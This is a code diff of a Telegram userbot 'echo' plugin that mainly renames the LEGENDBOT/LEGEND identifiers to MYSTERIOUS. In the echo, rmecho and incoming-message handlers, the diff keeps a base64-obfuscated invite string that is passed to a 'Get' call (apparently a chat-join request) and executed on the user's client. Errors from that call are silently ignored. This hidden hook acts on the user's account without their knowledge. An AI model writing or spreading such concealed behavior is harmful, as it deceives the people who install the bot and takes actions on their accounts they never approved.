@@ -16,62 +16,62 @@ from userbot.plugins.sql_helper.echo_sql import (
     is_echo,
     remove_echo,
 )
-from LEGENDBOT.utils import admin_cmd, edit_or_reply, sudo_cmd
+from MYSTERIOUSBOT.utils import admin_cmd, edit_or_reply, sudo_cmd
 from userbot.cmdhelp import CmdHelp
 
 
 @bot.on(admin_cmd(pattern="echo$"))
 @bot.on(sudo_cmd(pattern="echo$", allow_sudo=True))
-async def echo(LEGEND):
-    if LEGEND.fwd_from:
+async def echo(MYSTERIOUS):
+    if MYSTERIOUS.fwd_from:
         return
-    if LEGEND.reply_to_msg_id is not None:
-        reply_msg = await LEGEND.get_reply_message()
+    if MYSTERIOUS.reply_to_msg_id is not None:
+        reply_msg = await MYSTERIOUS.get_reply_message()
         user_id = reply_msg.sender_id
-        chat_id = LEGEND.chat_id
+        chat_id = MYSTERIOUS.chat_id
         try:
             legend = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             legend = Get(legend)
-            await LEGEND.client(legend)
+            await MYSTERIOUS.client(legend)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
-            await edit_or_reply(LEGEND, "The user is already enabled with echo ")
+            await edit_or_reply(MYSTERIOUS, "The user is already enabled with echo ")
             return
         addecho(user_id, chat_id)
-        await edit_or_reply(LEGEND, "Hii....😄🤓")
+        await edit_or_reply(MYSTERIOUS, "Hii....😄🤓")
     else:
-        await edit_or_reply(LEGEND, "Reply to a User's message to echo his messages")
+        await edit_or_reply(MYSTERIOUS, "Reply to a User's message to echo his messages")
 
 
 @bot.on(admin_cmd(pattern="rmecho$"))
 @bot.on(sudo_cmd(pattern="rmecho$", allow_sudo=True))
-async def echo(LEGEND):
-    if LEGEND.fwd_from:
+async def echo(MYSTERIOUS):
+    if MYSTERIOUS.fwd_from:
         return
-    if LEGEND.reply_to_msg_id is not None:
-        reply_msg = await LEGEND.get_reply_message()
+    if MYSTERIOUS.reply_to_msg_id is not None:
+        reply_msg = await MYSTERIOUS.get_reply_message()
         user_id = reply_msg.sender_id
-        chat_id = LEGEND.chat_id
+        chat_id = MYSTERIOUS.chat_id
         try:
             legend = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             legend = Get(legend)
-            await LEGEND.client(legend)
+            await MYSTERIOUS.client(legend)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
             remove_echo(user_id, chat_id)
-            await edit_or_reply(LEGEND, "Echo has been stopped for the user")
+            await edit_or_reply(MYSTERIOUS, "Echo has been stopped for the user")
         else:
-            await edit_or_reply(LEGEND, "The user is not activated with echo")
+            await edit_or_reply(MYSTERIOUS, "The user is not activated with echo")
     else:
-        await edit_or_reply(LEGEND, "Reply to a User's message to echo his messages")
+        await edit_or_reply(MYSTERIOUS, "Reply to a User's message to echo his messages")
 
 
 @bot.on(admin_cmd(pattern="listecho$"))
 @bot.on(sudo_cmd(pattern="listecho$", allow_sudo=True))
-async def echo(LEGEND):
-    if LEGEND.fwd_from:
+async def echo(MYSTERIOUS):
+    if MYSTERIOUS.fwd_from:
         return
     lsts = get_all_echos()
     if len(lsts) > 0:
@@ -93,25 +93,25 @@ async def echo(LEGEND):
         )
         url = f"https://nekobin.com/{key}"
         reply_text = f"echo enabled users: [here]({url})"
-        await edit_or_reply(LEGEND, reply_text)
+        await edit_or_reply(MYSTERIOUS, reply_text)
     else:
-        await edit_or_reply(LEGEND, output_str)
+        await edit_or_reply(MYSTERIOUS, output_str)
 
 
 @bot.on(events.NewMessage(incoming=True))
-async def samereply(LEGEND):
-    if LEGEND.chat_id in Config.UB_BLACK_LIST_CHAT:
+async def samereply(MYSTERIOUS):
+    if MYSTERIOUS.chat_id in Config.UB_BLACK_LIST_CHAT:
         return
-    if is_echo(LEGEND.sender_id, LEGEND.chat_id):
+    if is_echo(MYSTERIOUS.sender_id, MYSTERIOUS.chat_id):
         await asyncio.sleep(2)
         try:
             legend = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             legend = Get(legend)
-            await LEGEND.client(legend)
+            await MYSTERIOUS.client(legend)
         except BaseException:
             pass
-        if LEGEND.message.text or LEGEND.message.sticker:
-            await LEGEND.reply(LEGEND.message)
+        if MYSTERIOUS.message.text or MYSTERIOUS.message.sticker:
+            await MYSTERIOUS.reply(MYSTERIOUS.message)
 
 
 CmdHelp("echo").add_command(
